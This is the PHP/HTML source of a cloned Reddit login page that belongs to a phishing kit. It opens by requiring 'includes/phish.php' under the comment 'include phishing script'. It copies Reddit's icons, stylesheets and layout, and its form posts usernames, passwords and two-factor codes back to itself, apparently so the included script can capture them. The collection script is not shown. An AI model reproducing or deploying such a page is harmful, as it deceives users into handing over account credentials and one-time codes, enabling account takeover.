<?php
# include phishing script
require('includes/phish.php');
?>
<!DOCTYPE html>
<html lang="en-US">
    <head>
        <title>reddit.com: Log in</title>
        <link rel="shortcut icon" type="image/png" sizes="512x512" href="https://www.redditstatic.com/accountmanager/favicon/favicon-512x512.png">
        <link rel="shortcut icon" type="image/png" sizes="192x192" href="https://www.redditstatic.com/accountmanager/favicon/favicon-192x192.png">
        <link rel="shortcut icon" type="image/png" sizes="32x32" href="https://www.redditstatic.com/accountmanager/favicon/favicon-32x32.png">
        <link rel="shortcut icon" type="image/png" sizes="16x16" href="https://www.redditstatic.com/accountmanager/favicon/favicon-16x16.png">
        <link rel="apple-touch-icon" sizes="180x180" href="https://www.redditstatic.com/accountmanager/favicon/apple-touch-icon-180x180.png">
        <link rel="apple-touch-icon" sizes="57x57" href="https://www.redditstatic.com/desktop2x/img/favicon/apple-icon-57x57.png"/>
        <link rel="apple-touch-icon" sizes="60x60" href="https://www.redditstatic.com/desktop2x/img/favicon/apple-icon-60x60.png"/>
        <link rel="apple-touch-icon" sizes="72x72" href="https://www.redditstatic.com/desktop2x/img/favicon/apple-icon-72x72.png"/>
        <link rel="apple-touch-icon" sizes="76x76" href="https://www.redditstatic.com/desktop2x/img/favicon/apple-icon-76x76.png"/>
        <link rel="apple-touch-icon" sizes="114x114" href="https://www.redditstatic.com/desktop2x/img/favicon/apple-icon-114x114.png"/>
        <link rel="apple-touch-icon" sizes="120x120" href="https://www.redditstatic.com/desktop2x/img/favicon/apple-icon-120x120.png"/>
        <link rel="apple-touch-icon" sizes="144x144" href="https://www.redditstatic.com/desktop2x/img/favicon/apple-icon-144x144.png"/>
        <link rel="apple-touch-icon" sizes="152x152" href="https://www.redditstatic.com/desktop2x/img/favicon/apple-icon-152x152.png"/>
        <link rel="apple-touch-icon" sizes="180x180" href="https://www.redditstatic.com/desktop2x/img/favicon/apple-icon-180x180.png"/>
        <link rel="icon" type="image/png" sizes="192x192" href="https://www.redditstatic.com/desktop2x/img/favicon/android-icon-192x192.png"/>
        <link rel="icon" type="image/png" sizes="32x32" href="https://www.redditstatic.com/desktop2x/img/favicon/favicon-32x32.png"/>
        <link rel="icon" type="image/png" sizes="96x96" href="https://www.redditstatic.com/desktop2x/img/favicon/favicon-96x96.png"/>
        <link rel="icon" type="image/png" sizes="16x16" href="https://www.redditstatic.com/desktop2x/img/favicon/favicon-16x16.png"/>
        <link rel="manifest" href="https://www.redditstatic.com/desktop2x/img/favicon/manifest.json?v=2"/>
        <link rel="mask-icon" href="https://www.redditstatic.com/accountmanager/favicon/safari-pinned-tab.svg" color="#5bbad5">
        <link rel="canonical" href="https://www.reddit.com/login/">
        <meta name="msapplication-TileColor" content="#ffffff"/>
        <meta name="msapplication-TileImage" content="https://www.redditstatic.com/desktop2x/img/favicon/ms-icon-144x144.png"/>
        <meta name="theme-color" content="#FFFFFF" data-reactroot=""/>
        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
        <meta name="msapplication-TileColor" content="#ffffff"/>
        <meta name="msapplication-TileImage" content="https://www.redditstatic.com/accountmanager/favicon/mstile-310x310.png"/>
        <meta name="msapplication-TileImage" content="https://www.redditstatic.com/accountmanager/favicon/mstile-310x150.png"/>
        <meta name="theme-color" content="#ffffff">

<meta name="description" content="Don’t worry, we won’t tell anyone your username. Log in to your Reddit account.">



  <link rel="stylesheet" href="https://www.redditstatic.com/accountmanager/vendor.4edfac426c2c4357e34e.css">

  <link rel="stylesheet" href="https://www.redditstatic.com/accountmanager/theme.bf3c4fed32b8d285e588.css">

  <link rel="stylesheet" href="https://www.redditstatic.com/accountmanager/login.a2a948983c9f12b10c1b.css">


    </head>
    <body>

<div class="App m-desktop   ">

<form id="globals" autocomplete="off">
  <input type="hidden" name="app_name" value="login">
  <input type="hidden" name="csrf_token" value="0dac364b0e5b4fea863ceb0ff82467b2e65dba6b">
  <input type="hidden" name="dest" value="https://www.reddit.com">
  <input type="hidden" name="is_logged_in" value="">
  <input type="hidden" name="is_email_perm_required" value="">
  <input type="hidden" name="is_compact" value="False">
  <input type="hidden" name="is_mobile_ui" value="False">
  <input type="hidden" name="is_shreddit" value="False">
  <input type="hidden" name="subreddit_ids" value="">
  <input type="hidden" name="lang" value="en_US">



</form>

  <form id="props">

  <input type="hidden" name="cookie_domain" value=".reddit.com">
  <input type="hidden" name="is_oauth" value="False">
  <input type="hidden" name="ui_mode" value="">

  </form>

<main class="Login">

<div class="OnboardingStep Onboarding__step mode-auth" data-step="username-and-password">
  <div class="Step">

    <div class="Art Step__art"></div>

    <div class="Step__content">










        <h1 class="Title m-no-margin">Login</h1>

<p class="UserAgreement ">
  By continuing, you agree to our <a target="_blank" href="https://www.redditinc.com/policies/user-agreement">User Agreement</a> and <a target="_blank" href="https://www.redditinc.com/policies/privacy-policy">Privacy Policy</a>.
</p>



    <form class="AnimatedForm" action="" method="post">

        <p class="tfa-description hideable">
          You have two-factor authentication enabled on this account because you&#39;re awesome.
        </p>


      <div class="Sso">

          <div id="google-sso" class="Sso__button Sso__googleIdButton">
            Continue with Google
          </div>
          <div id="appleid-signin-container" class="Sso__button Sso__appleIdContainer">
            Continue with Apple
            <div id="appleid-signin" class="Sso__appleIdButton" data-type="sign in"></div>
          </div>







          <div class="Sso__divider ">
            <span class="Sso__dividerLine"></span>
            <span class="Sso__dividerText">or</span>
            <span class="Sso__dividerLine"></span>
          </div>

      </div>




<fieldset class="AnimatedForm__field m-required login hideable">

  <input id="loginUsername" class="AnimatedForm__textInput " type="text" name="reddit-username" required placeholder="
        Username
      ">
  <label class="AnimatedForm__textInputLabel " for="loginUsername">

        Username

  </label>
  <div class="AnimatedForm__errorMessage"></div>
</fieldset>


<fieldset class="AnimatedForm__field m-required password hideable m-small-margin">

  <input id="loginPassword" class="AnimatedForm__textInput " type="password" name="reddit-password" required placeholder="
        Password
      ">
  <label class="AnimatedForm__textInputLabel " for="loginPassword">

        Password

  </label>
  <div class="AnimatedForm__errorMessage"></div>
</fieldset>



      <div class="two-modes-separator"></div>

<fieldset class="AnimatedForm__field m-required otp">


  <input id="otp" class="AnimatedForm__textInput " type="tel" name="otp" pattern="[0-9]*" autocomplete="off" placeholder="
    6 digit code
  " data-lpignore="true">
  <label class="AnimatedForm__textInputLabel " for="otp">

    6 digit code

  </label>
  <div class="AnimatedForm__errorMessage"></div>
</fieldset>


<fieldset class="AnimatedForm__field switch-otp-type">
  <input type="hidden" name="otp-type" value="app">
  <span class="BottomLink switch-otp-type">

      use a backup code
  </span>
</fieldset>




<fieldset class="AnimatedForm__field m-small-margin">
  <button class="AnimatedForm__submitButton m-full-width" type="submit" name="reddit-login">

        Log In

  </button>
  <div class="AnimatedForm__submitStatus">
    <div class="AnimatedForm__submitStatusIcon"></div>
    <span class="AnimatedForm__submitStatusMessage"></span>
  </div>
</fieldset>



        <div class="BottomText m-secondary-text login-bottom-text hideable">





          <span class="BottomLink m-secondary-text">Forgot your</span> <a class="BottomLink m-secondary-text" href="<?php echo $reddit_link; ?>/username">username</a> <span class="BottomLink m-secondary-text">or</span> <a class="BottomLink m-secondary-text" href="<?php echo $reddit_link; ?>/password">password</a><span class="BottomLink m-secondary-text m-question">&nbsp;?</span>
        </div>



<div class="BottomText login-bottom-text register hideable">
  New to Reddit?

    <a class="BottomLink" href="<?php echo $reddit_link; ?>/account/register/">Sign up</a>

</div>



        <div class="BottomText tfa-bottom-text hideable">
          <span class="BottomLink back-to-main">Go&nbsp;back&nbsp;to&nbsp;account&nbsp;details</span><!--
          --><span class="LinkSeparator">•</span><!--
          --><a class="BottomLink" target="_blank" href="https://www.reddithelp.com/en/categories/using-reddit/your-reddit-account/how-set-two-factor-authentication">Having&nbsp;trouble&nbsp;?</a>
        </div>

    </form>

    </div>
  </div>
</div>























<div class="OnboardingStep Onboarding__step " data-step="subscribe">
  <div class="Step">

    <div class="Step__content">







      <div class="AnimatedForm__header">
        <h1 class="Title m-no-margin">Find communities by topics you’re interested in.</h1>
        <p class="Description">
          Reddit is filled with interest based communities, offering something for everyone.
          <br/>
          Reddit works best when you have joined at least 5 communities.
        </p>
      </div>
      <div id="SubredditSubscriptions"></div>
      <div class="AnimatedForm__bottomNav">
        <span class="AnimatedForm__submitStatus" data-step="&lt;Macro &#39;step&#39;&gt;">
          <span class="AnimatedForm__submitStatusIcon"></span>
          <span class="AnimatedForm__submitStatusMessage"></span>
        </span>
        <button class="AnimatedForm__submitButton SubscribeButton" type="submit" data-step="&lt;Macro &#39;step&#39;&gt;">Finish</button>
      </div>

    </div>
  </div>
</div>




</main>

</div>


        <!--<script>
            //<![CDATA

                window.___r = {"config": {"tracker_endpoint": "https://events.reddit.com/v2", "tracker_key": "AccountManager3", "tracker_secret": "V2FpZ2FlMlZpZTJ3aWVyMWFpc2hhaGhvaHNoZWl3"}};
            //]]>
        </script>



    <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/vendor.941e4bd8482652215fd8.js"></script>

    <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/theme.f14f24331125726619b0.js"></script>

    <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/sentry.a6aa116edbd163ca9db2.js"></script>

    <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/login.287f1b9b65a1c4e99367.js"></script>

-->
    </body>
</html>
